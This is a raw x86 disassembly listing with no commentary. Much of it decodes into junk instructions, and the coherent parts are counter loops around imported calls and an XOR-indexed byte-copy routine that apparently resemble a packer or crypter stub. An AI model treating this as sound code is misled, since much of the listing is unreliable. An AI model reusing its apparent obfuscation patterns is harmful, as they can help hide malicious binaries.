  402907:	(bad)  
  402909:	mov    WORD PTR [eax+0x50],?
  40290c:	shr    DWORD PTR [ebp-0x5],1
  40290f:	in     al,0xb9
  402911:	mov    ds,WORD PTR [esi+ebx*1]
  402914:	xor    edx,DWORD PTR [edx+ebx*2-0x204f8b83]
  40291b:	mov    BYTE PTR ds:0xd779950d,ch
  402921:	sbb    al,BYTE PTR [ebp+0xa7f9000]
  402927:	jmp    0x4090:0x67b2d780
  40292e:	jno    0x402975
  402930:	mov    al,0x61
  402932:	and    BYTE PTR ss:[edx],0x50
  402936:	out    dx,eax
  402937:	and    ebp,edx
  402939:	dec    edx
  40293a:	inc    esp
  40293b:	pop    ebx
  40293c:	(bad)
  40293f:	gs ss into 
  402942:	lock jbe 0x40291c
  402945:	add    eax,0x5815b352
  40294a:	add    eax,0xd10e2243
  40294f:	ret    0x807b
  402952:	jmp    0x1411:0x9799a188
  402959:	jo     0x40294e
  40295b:	xor    esp,DWORD PTR [ecx+0x9]
  40295e:	addr16 and al,0x18
  402961:	fcmovne st,st(5)
  402963:	test   edx,ecx
  402965:	mov    cl,0xf4
  402967:	cmp    BYTE PTR [esi],ch
  402969:	retf   
  40296a:	pop    ecx
  40296b:	xchg   BYTE PTR [edx+0x3d],ah
  40296e:	fwait
  40296f:	pop    es
  402970:	cmp    DWORD PTR [ebx-0x46362318],ecx
  402976:	ja     0x40299c
  402978:	imul   ebx,DWORD PTR [edi+esi*8-0x4d],0x54dca9a4
  402980:	out    dx,al
  402981:	cmp    al,0x30
  402983:	adc    al,0xfd
  402985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402986:	xchg   esi,eax
  402987:	cdq    
  402988:	enter  0xda0e,0xbc
  40298c:	xchg   edx,eax
  40298d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298e:	mov    BYTE PTR [edi+0x1a],dl
  402991:	sub    esp,DWORD PTR [ecx]
  402993:	cmp    BYTE PTR [edx-0xbbdb48c],0xe9
  40299a:	sbb    al,0xc4
  40299c:	xchg   edx,eax
  40299d:	sbb    DWORD PTR [esi+0x19efc4d9],ecx
  4029a3:	adc    ebx,eax
  4029a5:	shl    DWORD PTR [ecx+0x6d],0xe4
  4029a9:	xchg   DWORD PTR [edx],eax
  4029ab:	call   0xeac9:0xfae0c914
  4029b2:	aas    
  4029b3:	xchg   esi,eax
  4029b4:	add    al,0x5b
  4029b6:	cld    
  4029b7:	pop    ss
  4029b8:	jmp    0xa584eef1
  4029bd:	outs   dx,BYTE PTR ds:[esi]
  4029be:	frstor [eax]
  4029c0:	test   BYTE PTR [ebp-0x55],bh
  4029c3:	pop    es
  4029c4:	push   ds
  4029c5:	fsubr  QWORD PTR [edx-0x9d5d738]
  4029cb:	adc    edx,DWORD PTR [edi-0x39838e67]
  4029d1:	pop    es
  4029d2:	xchg   esp,eax
  4029d3:	jno    0x40296e
  4029d5:	lea    edx,[esi-0x1298ad12]
  4029db:	lock xchg BYTE PTR [ebx+0x2d],dh
  4029df:	lods   al,BYTE PTR ds:[esi]
  4029e0:	mov    ecx,0xf6383679
  4029e5:	add    al,0xb5
  4029e7:	add    ebx,DWORD PTR [ebp+0x2a76a8a9]
  4029ed:	cmp    ebp,DWORD PTR [ebx+0x1ca61455]
  4029f3:	mov    esp,0x26197a8c
  4029f8:	ror    BYTE PTR ds:0x86b1de0e,1
  4029fe:	pop    ebp
  4029ff:	ja     0x402a53
  402a01:	cmp    cl,BYTE PTR [esi-0x755f79b4]
  402a07:	adc    ecx,ebp
  402a09:	jge    0x402a16
  402a0b:	(bad)  [ebx+0x2f]
  402a0e:	cmp    eax,0x8cf53475
  402a13:	not    BYTE PTR ds:0x8151c71e
  402a19:	and    eax,0x434607
  402a1e:	add    BYTE PTR [eax],al
  402a20:	add    BYTE PTR [eax],al
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434607
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434607,edx
  402a34:	cmp    DWORD PTR ds:0x434607,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434607,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x434563
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434607,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434607
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434607,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x43457f,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x4345bb,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x4345f7,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x4345f7
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x4345f7,ecx
  402aac:	cmp    DWORD PTR ds:0x4345f7,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x4345f7,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43468f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x43467b
  402ae8:	or     DWORD PTR ds:0x434647,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x434637,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x434643,0x434583
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	xchg   esi,eax
  402b20:	sub    al,bl
  402b22:	mov    dh,BYTE PTR [ebx+0x9]
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402ace
  402b2c:	cdq    
  402b2d:	pop    ebp
  402b2e:	or     al,ch
  402b30:	sbb    eax,0xf791f34e
  402b35:	cwde   
  402b36:	mov    al,ds:0x2dd526d8
  402b3b:	pop    edx
  402b3c:	cmc    
  402b3d:	xchg   ecx,eax
  402b3e:	or     BYTE PTR [edi],al
  402b40:	call   0x43bb:0x649e46c5
  402b47:	data16 add ch,BYTE PTR [esp+eiz*8+0x109b711d]
  402b4f:	out    0xed,eax
  402b51:	pushf  
  402b52:	dec    esi
  402b53:	ja     0x402b9d
  402b55:	je     0x402ba5
  402b57:	add    bh,ah
  402b59:	mov    ch,0xf1
  402b5b:	ficom  WORD PTR [ecx+0x1aeabc1b]
  402b61:	aad    0x67
  402b63:	sub    eax,esi
  402b65:	jecxz  0x402b9b
  402b67:	(bad)
  402b6a:	and    esi,eax
  402b6c:	push   edi
  402b6d:	cld    
  402b6e:	inc    ecx
  402b6f:	(bad)  
  402b70:	jne    0x402b22
  402b72:	cdq    
  402b73:	xchg   edx,eax
  402b74:	ror    bl,cl
  402b76:	mov    bl,0xc
  402b78:	mov    dh,0x58
  402b7a:	out    0xe1,al
  402b7c:	test   al,0x84
  402b7e:	dec    eax
  402b7f:	jl     0x402bdd
  402b81:	xchg   ebx,eax
  402b82:	sar    ebp,1
  402b84:	inc    edx
  402b85:	lock pop eax
  402b87:	pusha  
  402b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b89:	pop    esp
  402b8a:	std    
  402b8b:	ss aas 
  402b8d:	fs jmp 0x48b6ccea
  402b93:	outs   dx,DWORD PTR ds:[esi]
  402b94:	xchg   ebx,eax
  402b95:	ja     0x402b6c
  402b97:	mov    edi,0xb219bd28
  402b9c:	stos   DWORD PTR es:[edi],eax
  402b9d:	fucomi st,st(4)
  402b9f:	shl    bh,0x84
  402ba2:	(bad)  
  402ba3:	jg     0x402b64
  402ba5:	shr    ah,0x33
  402ba8:	push   0xb178681f
  402bad:	add    eax,0x8fc19978
  402bb2:	sbb    eax,ecx
  402bb4:	or     DWORD PTR [edi+0x1d],ebp
  402bb7:	and    BYTE PTR [edx-0x4dabd3f2],bl
  402bbd:	jbe    0x402b92
  402bbf:	or     al,0xb2
  402bc1:	fs sub dh,bl
  402bc4:	dec    edi
  402bc5:	jmp    0x83d1:0x6dd0c7cc
  402bcc:	and    al,0xf5
  402bce:	mov    ecx,0xf3c72953
  402bd3:	cmp    al,0x54
  402bd5:	xchg   ecx,eax
  402bd6:	adc    eax,ecx
  402bd8:	or     al,0xc2
  402bda:	and    eax,0xc4d80767
  402bdf:	mov    ebx,0x494a1e42
  402be4:	mov    eax,ds:0x3cf3efc5
  402be9:	push   0x69
  402beb:	xor    edi,eax
  402bed:	fwait
  402bee:	les    edi,FWORD PTR [eax]
  402bf0:	mov    bh,0x4f
  402bf2:	mov    esp,0x70bd8a1
  402bf7:	pop    edx
  402bf8:	sar    ch,1
  402bfa:	aam    0x98
  402bfc:	cld    
  402bfd:	scas   eax,DWORD PTR es:[edi]
  402bfe:	call   0xedac47e6
  402c03:	add    al,0x21
  402c05:	leave  
  402c06:	fiadd  DWORD PTR [eax+0x25f012a6]
  402c0c:	aad    0x92
  402c0e:	imul   DWORD PTR [esp+eiz*4+0x44e5d661]
  402c15:	adc    ecx,DWORD PTR [eax-0x586fa296]
  402c1b:	inc    esi
  402c1c:	mov    ds:0x60a1d211,al
  402c21:	push   0xa711773a
  402c26:	popa   
  402c27:	add    BYTE PTR [edi+ebp*8],bl
  402c2a:	and    al,0xdf
  402c2c:	mov    bl,0x46
  402c2e:	aam    0x47
  402c30:	sti    
  402c31:	leave  
  402c32:	or     eax,0x467f6fff
  402c37:	stc    
  402c38:	scas   al,BYTE PTR es:[edi]
  402c39:	test   DWORD PTR [edx],edi
  402c3b:	sbb    bl,BYTE PTR [eax+0x5f]
  402c3e:	or     BYTE PTR [ebx-0x2],0x79
  402c42:	iret   
  402c43:	lods   al,BYTE PTR ds:[esi]
  402c44:	push   ss
  402c45:	xor    BYTE PTR [esi+0x21],ah
  402c48:	xchg   ecx,eax
  402c49:	mov    edi,0x3bd60378
  402c4e:	cli    
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434587,0x0
  402c5f:	mov    eax,ds:0x434587
  402c64:	inc    eax
  402c65:	mov    ds:0x434587,eax
  402c6a:	cmp    DWORD PTR ds:0x434587,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434587,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x434567,0x434693
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	scas   al,BYTE PTR es:[edi]
  402ce7:	fistp  DWORD PTR [ebp+0x2b]
  402cea:	adc    ecx,DWORD PTR [ebx]
  402cec:	jle    0x402d6c
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402cc4
  402cf3:	adc    al,0x99
  402cf5:	pop    esi
  402cf6:	dec    esi
  402cf7:	lds    ebx,FWORD PTR [edx+0xc445098]
  402cfd:	or     al,0x1
  402cff:	les    eax,FWORD PTR [esi-0x22]
  402d02:	mov    dh,0x9d
  402d04:	xchg   ecx,eax
  402d05:	popa   
  402d06:	or     al,0x1e
  402d08:	pop    esp
  402d09:	clc    
  402d0a:	xchg   ebp,eax
  402d0b:	stos   DWORD PTR es:[edi],eax
  402d0c:	jmp    0xc8393a4b
  402d11:	(bad)  
  402d12:	jmp    0x74646a53
  402d17:	and    eax,0xb118702
  402d1c:	sub    BYTE PTR [ebx*2-0x39c79d68],0xb8
  402d24:	out    0xd6,eax
  402d26:	xor    esp,edi
  402d28:	xlat   BYTE PTR ds:[ebx]
  402d29:	out    dx,al
  402d2a:	sub    al,0x8f
  402d2c:	ret    0xec5e
  402d2f:	ins    DWORD PTR es:[edi],dx
  402d30:	or     al,0x52
  402d32:	test   BYTE PTR [ebp-0x3005be6a],dl
  402d38:	adc    edx,DWORD PTR [edx+0x5c]
  402d3b:	in     al,0xcf
  402d3d:	test   al,0x1e
  402d3f:	mov    esi,0x7e7650c7
  402d44:	aaa    
  402d45:	pop    ebx
  402d46:	pop    esp
  402d47:	jl     0x402d61
  402d49:	adc    al,0x4e
  402d4b:	rcr    DWORD PTR [edi],0xe8
  402d4e:	std    
  402d4f:	shr    DWORD PTR [ebp+0x72],0x38
  402d53:	inc    esi
  402d54:	pop    ebx
  402d55:	aas    
  402d56:	scas   al,BYTE PTR es:[edi]
  402d57:	mov    BYTE PTR ds:0xe27441e4,ah
  402d5d:	sbb    BYTE PTR [edi+0x7fa77fd5],bh
  402d63:	popa   
  402d64:	mov    edi,0x9ccecbb0
  402d69:	push   esp
  402d6a:	xchg   edx,eax
  402d6b:	stos   DWORD PTR es:[edi],eax
  402d6c:	outs   dx,DWORD PTR ds:[esi]
  402d6d:	mov    edx,0xe27b5af2
  402d72:	dec    edi
  402d73:	mov    al,0xbc
  402d75:	mov    esp,0x6fe444c1
  402d7a:	retf   
  402d7b:	les    esi,FWORD PTR [edi+0x1034d221]
  402d81:	push   edi
  402d82:	cmp    DWORD PTR [ebx],ebp
  402d84:	ins    DWORD PTR es:[edi],dx
  402d85:	xor    bl,0x9a
  402d88:	fstp   QWORD PTR [ebx]
  402d8a:	ret    0x8dce
  402d8d:	pop    ss
  402d8e:	cli    
  402d8f:	pop    esi
  402d90:	mov    cl,0x7f
  402d92:	das    
  402d93:	call   0x7ba2a08e
  402d98:	sbb    BYTE PTR [eax],cl
  402d9a:	sub    al,0xd6
  402d9c:	mov    cl,0x32
  402d9e:	int3   
  402d9f:	aaa    
  402da0:	or     eax,DWORD PTR fs:[esp+ecx*8+0x53]
  402da5:	sti    
  402da6:	jnp    0x402e1c
  402da8:	cmp    eax,0x37ee7408
  402dad:	adc    cl,BYTE PTR [esi]
  402daf:	inc    edx
  402db0:	mov    ecx,0x328e31ca
  402db5:	in     eax,dx
  402db6:	ret    0x24fc
  402db9:	push   ebx
  402dba:	inc    esp
  402dbb:	dec    ebp
  402dbc:	out    dx,al
  402dbd:	call   0xc846f616
  402dc2:	and    BYTE PTR [ecx],0x77
  402dc5:	ins    BYTE PTR es:[edi],dx
  402dc6:	xor    esi,DWORD PTR [ebp+eiz*8+0x5a]
  402dca:	lds    edi,FWORD PTR [edx]
  402dcc:	pop    ds
  402dcd:	pop    edi
  402dce:	cmp    eax,DWORD PTR [eax+0x59]
  402dd1:	jns    0x402e21
  402dd3:	es dec edi
  402dd5:	adc    ebp,eax
  402dd7:	ja     0x402e52
  402dd9:	lea    edi,[ecx-0x3ef6f2b3]
  402ddf:	and    DWORD PTR [eax],ebx
  402de1:	mov    al,ds:0x592e0c54
  402de6:	pop    ds
  402de7:	and    DWORD PTR [edx],0xffffffb3
  402dea:	adc    dh,BYTE PTR [ebx-0x5f]
  402ded:	outs   dx,DWORD PTR ds:[esi]
  402dee:	(bad)  
  402def:	and    ecx,eax
  402df1:	loopne 0x402dfb
  402df3:	in     eax,0x1a
  402df5:	xchg   ecx,eax
  402df6:	mov    ds:0xea79de96,eax
  402dfb:	mov    BYTE PTR [edx+0x76],dl
  402dfe:	xchg   esi,eax
  402dff:	xor    BYTE PTR [edx+0x18],ch
  402e02:	pusha  
  402e03:	sti    
  402e04:	mov    edx,ebx
  402e06:	imul   ebx,esp,0x77cf4684
  402e0c:	mov    esi,0x7531fd94
  402e11:	dec    eax
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x4345f7,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    ah,BYTE PTR [edx*2+0x1433ef99]
  402e98:	jle    0x402f18
  402e9a:	push   esi
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e2c
  402e9f:	ss out dx,al
  402ea1:	and    al,0x2c
  402ea3:	adc    dl,ch
  402ea5:	inc    BYTE PTR [edi+0x7c]
  402ea8:	sub    eax,0x5e953570
  402ead:	mov    cl,0xd0
  402eaf:	lods   eax,DWORD PTR ds:[esi]
  402eb0:	and    al,0x42
  402eb2:	sti    
  402eb3:	dec    edi
  402eb4:	sbb    al,0xa9
  402eb6:	mov    BYTE PTR [ecx],bh
  402eb8:	mov    al,ah
  402eba:	xor    DWORD PTR [esi],edi
  402ebc:	addr16 in al,dx
  402ebe:	jp     0x402ebc
  402ec0:	fsub   QWORD PTR [eax-0x98b891b]
  402ec6:	int    0xf9
  402ec8:	mov    ch,0xdc
  402eca:	cmp    DWORD PTR [edx+0xb],ebx
  402ecd:	jno    0x402ebb
  402ecf:	jb     0x402edb
  402ed1:	fxch   st(5)
  402ed3:	mov    al,0xf7
  402ed5:	stos   DWORD PTR es:[edi],eax
  402ed6:	js     0x402f4d
  402ed8:	xchg   ebx,eax
  402ed9:	adc    al,0x11
  402edb:	aaa    
  402edc:	cs ins DWORD PTR es:[edi],dx
  402ede:	lock arpl WORD PTR [edx+0x14],cx
  402ee2:	mov    edi,0xc9a17e5a
  402ee7:	js     0x402f54
  402ee9:	out    dx,al
  402eea:	inc    ebx
  402eeb:	sub    al,0x10
  402eed:	mov    esi,0x1df73578
  402ef2:	repnz pop ds
  402ef4:	mov    al,0xe6
  402ef6:	div    ebx
  402ef8:	pusha  
  402ef9:	inc    ecx
  402efa:	xchg   edi,eax
  402efb:	scas   al,BYTE PTR es:[edi]
  402efc:	mov    ebp,0xd906e63b
  402f01:	xchg   ebx,eax
  402f02:	mov    esp,edi
  402f04:	lock test DWORD PTR [ecx+0x68537c0c],esi
  402f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f0c:	mov    esp,0x3c780946
  402f11:	jb     0x402f40
  402f13:	cli    
  402f14:	cs sahf 
  402f16:	icebp  
  402f17:	ja     0x402f06
  402f19:	and    al,0x9e
  402f1b:	cmp    esp,DWORD PTR [edi+0x783d5adb]
  402f21:	stos   BYTE PTR es:[edi],al
  402f22:	xor    ah,BYTE PTR [eax]
  402f24:	dec    ebx
  402f25:	cmp    cl,bl
  402f27:	mov    ?,edx
  402f29:	dec    ebp
  402f2a:	sbb    al,0x50
  402f2c:	jns    0x402ecf
  402f2e:	stc    
  402f2f:	or     eax,0xd95aef26
  402f34:	loop   0x402f32
  402f36:	aad    0xfd
  402f38:	and    DWORD PTR [ecx-0x4c],0xf3069c5e
  402f3f:	xor    BYTE PTR [edi-0x69],bh
  402f42:	sub    dh,0x37
  402f45:	sbb    eax,DWORD PTR [esi]
  402f47:	inc    edx
  402f48:	xchg   DWORD PTR [ebx+0x741d7a86],esi
  402f4e:	imul   ecx,DWORD PTR [edi-0x7],0x6
  402f52:	lahf   
  402f53:	pusha  
  402f54:	push   ecx
  402f55:	mov    ds:0xf8f0b71a,al
  402f5a:	cmp    al,0x9e
  402f5c:	cmp    dh,BYTE PTR [edx]
  402f5e:	lods   eax,DWORD PTR ds:[esi]
  402f5f:	mov    ebx,0xa582f806
  402f64:	jp     0x402f26
  402f66:	push   ecx
  402f67:	sar    BYTE PTR [edx],cl
  402f69:	inc    esi
  402f6a:	popa   
  402f6b:	and    al,0xe2
  402f6d:	mov    cl,0x51
  402f6f:	popa   
  402f70:	and    ecx,DWORD PTR [ebx]
  402f72:	cmp    eax,0xc9cc4487
  402f77:	lods   eax,DWORD PTR ds:[esi]
  402f78:	jge    0x402fc8
  402f7a:	ins    DWORD PTR es:[edi],dx
  402f7b:	shl    DWORD PTR [ecx-0x68ed2cd9],cl
  402f81:	daa    
  402f82:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402f84:	fild   WORD PTR [esi]
  402f86:	add    DWORD PTR [ebx],esi
  402f88:	shl    eax,1
  402f8a:	dec    esi
  402f8b:	inc    eax
  402f8c:	mov    edi,0x42055f21
  402f91:	in     eax,dx
  402f92:	ss loope 0x402fda
  402f95:	mov    esp,0x7cc80c37
  402f9a:	mov    gs,WORD PTR [edx+0x5d]
  402f9d:	lea    ecx,[edx+0x544c4b66]
  402fa3:	(bad)  
  402fa4:	rcl    BYTE PTR [eax-0x2b],cl
  402fa7:	mov    ah,0xad
  402fa9:	dec    edx
  402faa:	retf   
  402fab:	in     al,0xf6
  402fad:	mov    edx,DWORD PTR [ecx+0x52]
  402fb0:	cli    
  402fb1:	cwde   
  402fb2:	sub    BYTE PTR [esp+ebx*8-0x5d0654fe],0x89
  402fba:	cld    
  402fbb:	adc    edx,DWORD PTR [esi]
  402fbd:	jmp    0xf4ee4f30
  402fc2:	dec    ebp
  402fc3:	pop    edx
  402fc4:	jnp    0x403009
  402fc6:	xor    al,BYTE PTR [eax+eax*1+0x787164be]
  402fcd:	in     al,dx
  402fce:	fsub   QWORD PTR [ebx+0x18]
  402fd1:	xchg   esi,eax
  402fd2:	jb     0x402f70
  402fd4:	mov    al,ds:0xab22c72e
  402fd9:	lods   al,BYTE PTR ds:[esi]
  402fda:	inc    ecx
  402fdb:	into   
  402fdc:	adc    al,0x29
  402fde:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402fe0:	jae    0x40304c
  402fe2:	scas   eax,DWORD PTR es:[edi]
  402fe3:	dec    eax
  402fe4:	and    eax,0xc80e613f
  402fe9:	rcl    DWORD PTR [eax],cl
  402feb:	jne    0x402f77
  402fed:	fidiv  DWORD PTR [edi+ebp*8]
  402ff0:	push   ecx
  402ff1:	push   edi
  402ff2:	ret    
  402ff3:	nop
  402ff4:	mov    al,0xf6
  402ff6:	jecxz  0x402f88
  402ff8:	cmp    BYTE PTR [ebx],cl
  402ffa:	inc    ebp
  402ffb:	repnz retf 0x5f24
  402fff:	stc    
  403000:	ins    DWORD PTR es:[edi],dx
  403001:	out    0x1b,eax
  403003:	xor    esi,DWORD PTR [ebx]
  403005:	or     BYTE PTR [edi],0x4f
  403008:	dec    edi
  403009:	or     eax,0xb9f0db9
  40300e:	sub    edi,DWORD PTR [ebx+ecx*4-0x528b984d]
  403015:	jns    0x403030
  403017:	add    BYTE PTR [ebp+0x18ba2920],0xf5
  40301e:	lods   eax,DWORD PTR ds:[esi]
  40301f:	push   ecx
  403020:	aaa    
  403021:	(bad)  
  403022:	clc    
  403023:	sub    DWORD PTR [ebx-0x9682b60],0x24627af2
  40302d:	ds int 0x9d
  403030:	sbb    al,BYTE PTR [edx]
  403032:	scas   al,BYTE PTR es:[edi]
  403033:	aad    0x6c
  403035:	ins    DWORD PTR es:[edi],dx
  403036:	or     edx,DWORD PTR [esi-0x44277471]
  40303c:	cdq    
  40303d:	jl     0x402fe6
  40303f:	xchg   edx,eax
  403040:	sbb    al,0x6c
  403042:	adc    DWORD PTR [ebx+0x37],edx
  403045:	and    al,0xad
  403047:	xchg   ebx,eax
  403048:	fild   DWORD PTR [eax+0x750da48]
  40304e:	es in  al,0xe0
  403051:	sbb    eax,0x4b239907
  403056:	cmp    ecx,DWORD PTR [ebx-0x6a]
  403059:	sub    eax,0xc97e64e7
  40305e:	fild   DWORD PTR [esi]
  403060:	retf   
  403061:	pop    es
  403062:	(bad)  
  403063:	push   ss
  403064:	bound  esi,QWORD PTR [edx+0x34]
  403067:	push   ss
  403068:	imul   edi,DWORD PTR [eax-0xa],0x33
  40306c:	popa   
  40306d:	xchg   eax,esp
  40306f:	and    al,0x35
  403071:	out    dx,al
  403072:	mov    ds:0x68948dc6,eax
  403077:	cmp    al,0x87
  403079:	shl    BYTE PTR [esi-0x1baef6fb],0x58
  403080:	ret    
  403081:	push   ebx
  403082:	push   ebx
  403083:	cmp    DWORD PTR [edi+0x1b],edi
  403086:	sbb    bl,BYTE PTR [eax]
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	dec    BYTE PTR [ebx+0x5]
  40308c:	scas   al,BYTE PTR es:[edi]
  40308d:	xchg   bl,dh
  40308f:	loope  0x40301d
  403091:	push   0x60f4441f
  403096:	out    0xe1,al
  403098:	jae    0x40305a
  40309a:	pop    ds
  40309b:	add    BYTE PTR [edx],dl
  40309d:	fst    QWORD PTR [esi]
  40309f:	lahf   
  4030a0:	mov    ah,0x6f
  4030a2:	pop    eax
  4030a3:	xchg   DWORD PTR [ebx-0x5a735957],edx
  4030a9:	dec    edx
  4030aa:	int    0xe
  4030ac:	pop    ds
  4030ad:	or     al,BYTE PTR [eax+0x58f6f358]
  4030b3:	int    0x79
  4030b5:	cmp    BYTE PTR [ebx-0x78effbc],bh
  4030bb:	sbb    BYTE PTR [esi+edx*4],0xd3
  4030bf:	cmp    al,0x2e
  4030c1:	lods   al,BYTE PTR ds:[esi]
  4030c2:	xchg   DWORD PTR [edi],esp
  4030c4:	retf   
  4030c5:	cmp    BYTE PTR [ebp-0x64207a6b],ch
  4030cb:	addr16 stc 
  4030cd:	shr    BYTE PTR [ebx-0x794556b0],1
  4030d3:	jns    0x403077
  4030d5:	mov    dl,0x36
  4030d7:	mov    ebp,DWORD PTR [esi]
  4030d9:	arpl   WORD PTR [ebx-0x41],sp
  4030dc:	jp     0x403132
  4030de:	frstor [esi+eiz*8]
  4030e1:	in     al,dx
  4030e2:	loopne 0x403115
  4030e4:	jo     0x40308f
  4030e6:	cmc    
  4030e7:	mov    eax,ds:0x725a8ab
  4030ec:	or     eax,ebp
  4030ee:	loopne 0x403128
  4030f0:	les    ecx,FWORD PTR [ebp+esi*2+0x7]
  4030f4:	fdivr  QWORD PTR [esi+0x3b]
  4030f7:	push   0x7c
  4030f9:	aam    0xe8
  4030fb:	add    cl,BYTE PTR [ecx]
  4030fd:	xchg   esp,eax
  4030fe:	mov    WORD PTR [edx+ecx*1],es
  403101:	not    BYTE PTR [ebp+0xf]
  403104:	sbb    ebp,DWORD PTR ds:0xb8711bdf
  40310a:	fwait
  40310b:	jmp    0xad9247a3
  403110:	adc    eax,ebx
  403112:	push   edi
  403113:	pusha  
  403114:	mov    WORD PTR [ebx],fs
  403116:	sub    al,0x65
  403118:	jbe    0x4030e7
  40311a:	out    0x8e,al
  40311c:	inc    edi
  40311d:	gs push esi
  40311f:	inc    edx
  403120:	aad    0x8e
  403122:	(bad)  
  403123:	loop   0x4030e0
  403125:	and    ecx,esp
  403127:	dec    edi
  403128:	adc    BYTE PTR fs:[edi],ch
  40312b:	mov    ebp,0xe81a612a
  403130:	jne    0x40319b
  403132:	vandps xmm4,xmm3,xmm7
  403136:	test   WORD PTR [ebx],sp
  403139:	ins    DWORD PTR es:[edi],dx
  40313a:	jno    0x4030fc
  40313c:	mov    WORD PTR [esi-0xfdb86d9],?
  403142:	ss (bad) 
  403145:	in     al,dx
  403146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403147:	pop    ds
  403148:	pop    ds
  403149:	jecxz  0x403134
  40314b:	aaa    
  40314c:	loopne 0x4031a7
  40314e:	mov    al,cl
